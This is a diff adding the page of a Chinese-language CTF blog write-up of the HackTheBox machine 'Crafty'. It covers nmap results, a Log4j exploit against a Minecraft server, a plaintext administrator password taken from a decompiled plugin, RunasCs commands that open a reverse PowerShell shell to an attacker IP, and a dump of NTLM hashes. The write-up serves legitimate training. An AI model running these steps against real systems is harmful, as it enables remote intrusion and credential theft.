@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Crafty0x1 nmap12345678PORT      STATE SERVICE   REASON          VERSION80&#x2F;tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-title: Did not follow redirect to http:&#x2F;&#x2F;crafty.htb|_htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Crafty">
+<meta property="og:url" content="https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Crafty0x1 nmap12345678PORT      STATE SERVICE   REASON          VERSION80&#x2F;tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-title: Did not follow redirect to http:&#x2F;&#x2F;crafty.htb|_htt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211033122-c8h1va9.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211033212-7aztf9o.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211051603-dovmayq.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211054517-x5icdzp.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211055013-sof672q.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211060435-8eahyol.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211060448-jtc3vq0.png">
+<meta property="article:published_time" content="2024-02-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-16T09:59:35.580Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211033122-c8h1va9.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Crafty</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/16/2024-htb-challenge/02-0xBOverchunked/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/01/28/2024-htb-machine/04-pov/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&text=HackTheBox - Machine - Crafty"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&is_video=false&description=HackTheBox - Machine - Crafty"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Crafty&body=Check out this article: https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&name=HackTheBox - Machine - Crafty&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&t=HackTheBox - Machine - Crafty"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.9rem;
+	   color: #00b4dd ;
+	}
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 .level-5 .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Crafty
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-10T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-02-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Crafty"><a href="#Crafty" class="headerlink" title="Crafty"></a>Crafty</h1><h2 id="0x1-nmap"><a href="#0x1-nmap" class="headerlink" title="0x1 nmap"></a>0x1 nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE   REASON          VERSION</span><br><span class="line">80/tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Did not follow redirect to http://crafty.htb</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-80-web"><a href="#0x2-80-web" class="headerlink" title="0x2 80 web"></a>0x2 80 web</h2><p>好像没什么 QAQ</p>
+<h2 id="0x3-25565-Minecraft"><a href="#0x3-25565-Minecraft" class="headerlink" title="0x3 25565 Minecraft"></a>0x3 25565 Minecraft</h2><p>估计是log4j把，看这个古老的版本就知道了。。。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></p>
+<p>然后找到了这个，根据说明要注册一个账号下载java，而且版本也要是 <code>8u20</code>​ ，注意别下错了。</p>
+<p>然后把java提取出来放到poc目录下即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">Dockerfile  Exploit.class  Exploit.java  LICENSE  README.md  jdk1.8.0_20  poc.py  requirements.txt  target  vulnerable-application</span><br></pre></td></tr></table></figure>
+
+<p>看了这个poc的demo，也就是说要下载 minecraft启动器，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211033122-c8h1va9.png" alt="image">​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211033212-7aztf9o.png" alt="image">​</p>
+<p>然后下载 minecraft启动器，</p>
+<p>（还好我有正版）</p>
+<p>后面再说如何破解minecraft。</p>
+<p>然后修改这个poc，因为他的poc是基于linux的，所以要改成windows的payload，如下：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211051603-dovmayq.png" alt="image">​</p>
+<p>改完之后如下：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211054517-x5icdzp.png" alt="image">​</p>
+<p>之后打开minecraft连接服务器，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211055013-sof672q.png" alt="image">​</p>
+<p>然后得到user.txt</p>
+<p>‍</p>
+<p><strong>注意</strong>：当你打了poc之后，minecraft服务器很快就会crash了！！！ （<del>VIP+的好处来了</del>）</p>
+<h2 id="0x4-Root"><a href="#0x4-Root" class="headerlink" title="0x4 Root"></a>0x4 Root</h2><p>winpeas其实看不到什么东西，所以就猜系统内没有什么价值的东西。</p>
+<p>然后上传了个ripgrep去全文搜索一下关键子，因为就是那么几个关键字。</p>
+<p>关键字： <code>htb</code>，<code>admin</code> , 用户的名字等</p>
+<p>找到了如下的jar，所以就在思考为什么这个jar会有htb关键字，于是尝试反编译看看。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\svc_minecraft\server&gt; <span class="built_in">cd</span> .\plugins\ </span><br><span class="line"><span class="built_in">PS</span> C:\users\svc_minecraft\server\plugins&gt; <span class="built_in">ls</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\svc_minecraft\server\plugins</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>       <span class="number">10</span>/<span class="number">27</span>/<span class="number">2023</span>   <span class="number">2</span>:<span class="number">48</span> PM           <span class="number">9996</span> playercounter<span class="literal">-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT</span>.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有个jar，反编译这个jar 之后看到 admin的账号密码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Playercounter</span> <span class="keyword">extends</span> <span class="title class_">JavaPlugin</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEnable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Rcon</span> <span class="variable">rcon</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      rcon = <span class="keyword">new</span> <span class="title class_">Rcon</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">27015</span>, <span class="string">&quot;s67u84zKq8IXw&quot;</span>.getBytes());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AuthenticationException e2) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e2);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = rcon.command(<span class="string">&quot;players online count&quot;</span>);</span><br><span class="line">      <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="string">&quot;C:\\inetpub\\wwwroot\\playercount.txt&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">      writer.println(result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e3);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后使用runas工具 <code>https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_Any/_RunasCs.exe</code>​ </p>
+<p>登录即可：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\mane&gt; <span class="built_in">wget</span> <span class="number">10.10</span>.<span class="number">16.7</span>:<span class="number">2222</span>/Runas.exe <span class="literal">-o</span> runas.exe</span><br><span class="line"><span class="built_in">PS</span> C:\mane&gt; .\runas.exe administrator s67u84zKq8IXw <span class="string">&quot;powershell&quot;</span> <span class="literal">-r</span> <span class="number">10.10</span>.<span class="number">16.7</span>:<span class="number">6666</span></span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session <span class="number">1</span> with <span class="keyword">process</span> <span class="function"><span class="keyword">function</span> <span class="title">CreateProcessWithLogonW</span><span class="params">()</span></span></span><br><span class="line">[+] <span class="keyword">Using</span> Station\Desktop: WinSta0\Default</span><br><span class="line">[+] Async <span class="keyword">process</span> <span class="string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid <span class="number">6036</span> created <span class="keyword">in</span> background.</span><br></pre></td></tr></table></figure>
+
+<p>然后获得admin权限，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 6666                                                                                                                                                                       </span><br><span class="line">listening on [any] 6666 ...                                                                                                                                                             </span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.129.117.119] 49707                                                                                                                           </span><br><span class="line">Windows PowerShell                                                                                                                                                                      </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                               </span><br><span class="line">                                                                                                                                                                                        </span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span>                                                                                                                                                          </span><br><span class="line"><span class="built_in">whoami</span>                                                                                                                                                                                  </span><br><span class="line">crafty\administrator                             </span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="0xA-如何给mc打联网补丁？"><a href="#0xA-如何给mc打联网补丁？" class="headerlink" title="0xA 如何给mc打联网补丁？"></a>0xA 如何给mc打联网补丁？</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv24284596/">https://www.bilibili.com/read/cv24284596/</a></p>
+<p>我是使用的HMCL启动器：<a target="_blank" rel="noopener" href="https://github.com/HMCL-dev/HMCL/releases/tag/v3.5.5.235">https://github.com/HMCL-dev/HMCL/releases/tag/v3.5.5.235</a></p>
+<p>新建一个离线用户，然后安装1.16.5版本，在mod loader 使用forge加载器</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211060435-8eahyol.png" alt="image">​</p>
+<p>安装好之后，把这个mod扔进去即可启动游戏：mod下载链接：<a target="_blank" rel="noopener" href="https://www.mcmod.cn/class/10643.html">https://www.mcmod.cn/class/10643.html</a></p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/06-Crafty-kzEgI13hvRc1emHQ/image-20240211060448-jtc3vq0.png" alt="image">​</p>
+<p>启动好了之后就可以<del>开启地狱门进入终界屠杀龙</del>了。</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-secretsdump -sam sam  -system system LOCAL -<span class="built_in">history</span>   </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xad7915b8e6d4f9ee383a5176349739e3</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:686d56296249595a2bc3d7a8807958ad:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7f920fb73571539eb18c0b2f876cfda0:::</span><br><span class="line">jacob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::</span><br><span class="line">svc_minecraft:1002:aad3b435b51404eeaad3b435b51404ee:786082f9a8cb7872767bb1a4b7934451:::</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4 .level-5 .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&text=HackTheBox - Machine - Crafty"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&is_video=false&description=HackTheBox - Machine - Crafty"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Crafty&body=Check out this article: https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&title=HackTheBox - Machine - Crafty"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&name=HackTheBox - Machine - Crafty&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/02/11/2024-htb-machine/06-crafty/&t=HackTheBox - Machine - Crafty"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
